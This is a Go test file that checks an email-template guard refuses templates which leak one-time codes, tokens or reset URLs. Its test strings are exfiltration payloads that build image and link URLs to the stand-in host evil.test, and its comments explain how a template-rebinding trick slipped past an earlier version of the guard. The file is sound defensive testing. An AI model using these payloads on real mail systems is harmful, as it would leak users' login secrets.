package email

import (
	"strings"
	"testing"
)

// $.Code is a parse.VariableNode, not a FieldNode. nodeUsesSecret historically
// only walked FieldNode / ChainNode / PipeNode, so {{eq $.Code "000000"}} looked
// secret-free to refuseSecretControlFlow. Both canaries miss the probe,
// differential stays green, and checkEmailURL allows the constant https URL —
// the same one-bit auto-load oracle the .Code cases already refuse.
//
// {{template "name" .Code}} rebinds the callee's dot to the secret. A naive
// {{if eq . "000000"}} inside the define fails closed during validation because
// every associated body is also rendered alone under TemplateData (type error).
// A dual-type body that branches on printf "%T" executes cleanly under both
// shapes, looks constant across canaries, and beacons the live OTP — which is
// the payload this test pins.

func TestGuardRefusesDollarQualifiedSecretOracles(t *testing.T) {
	oracles := []struct {
		name string
		src  string
	}{
		{
			name: "eq $.Code emitted into img src",
			src:  `<p>Reset</p><img src="https://evil.test/c/{{eq $.Code "000000"}}">`,
		},
		{
			name: "ge $.Code binary-search in img src",
			src:  `<img src="https://evil.test/ge5/{{ge $.Code "500000"}}">`,
		},
		{
			name: "if eq $.Code branch",
			src:  `{{if eq $.Code "000000"}}<img src="https://evil.test/hit">{{end}}<p>x</p>`,
		},
		{
			name: "with $.Token then emit",
			src:  `{{with $.Token}}<img src="https://evil.test/t">{{end}}<p>x</p>`,
		},
		{
			name: "eq $.Token into href",
			src:  `<a href="https://evil.test/x/{{eq $.Token "nope"}}">Reset</a>`,
		},
		{
			name: "eq $.URL into img src",
			src:  `<img src="https://evil.test/u/{{eq $.URL "https://evil.test"}}">`,
		},
	}
	for _, tc := range oracles {
		t.Run(tc.name, func(t *testing.T) {
			err := guardTemplate([]byte(tc.src))
			if err == nil {
				t.Fatalf("guardTemplate ACCEPTED a $-qualified secret oracle: %s", tc.src)
			}
			if !strings.Contains(err.Error(), "derives") && !strings.Contains(err.Error(), "decides on the value") {
				t.Fatalf("refused for the wrong reason: %v", err)
			}
		})
	}
}

func TestGuardRefusesTemplateRebindOfSecret(t *testing.T) {
	// Dual-type define: alone under TemplateData it emits "false"; called with
	// .Code under canaries it also emits "false"; live OTP "000000" emits "true"
	// into an auto-loaded img src. Before the TemplateNode walk this passed
	// guardTemplate and beaconed.
	src := `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}` +
		`<p>x</p><img src="https://evil.test/c/{{template "probe" .Code}}">`
	err := guardTemplate([]byte(src))
	if err == nil {
		t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds the secret as dot: %s", src)
	}
	if !strings.Contains(err.Error(), "template") {
		t.Fatalf("refused for the wrong reason (want template-rebind refusal): %v", err)
	}
}

func TestGuardRefusesTemplateRebindOfDollarSecret(t *testing.T) {
	src := `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}` +
		`<p>x</p><img src="https://evil.test/c/{{template "probe" $.Code}}">`
	err := guardTemplate([]byte(src))
	if err == nil {
		t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds $.Code as dot: %s", src)
	}
	if !strings.Contains(err.Error(), "template") {
		t.Fatalf("refused for the wrong reason (want template-rebind refusal): %v", err)
	}
}

func TestGuardStillAllowsVerbatimDollarSecretActions(t *testing.T) {
	ok := []string{
		`<p>{{$.Code}}</p>`,
		`<p>{{$.Token}}</p>`,
		`<a href="{{$.URL}}">Reset</a>`,
		`<a href="{{$.URL | safeURL}}">Reset</a>`,
		`<p>{{$.Code | lower}}</p>`,
	}
	for _, src := range ok {
		if err := guardTemplate([]byte(src)); err != nil {
			t.Fatalf("guardTemplate rejected legitimate verbatim $-secret use %q: %v", src, err)
		}
	}
}
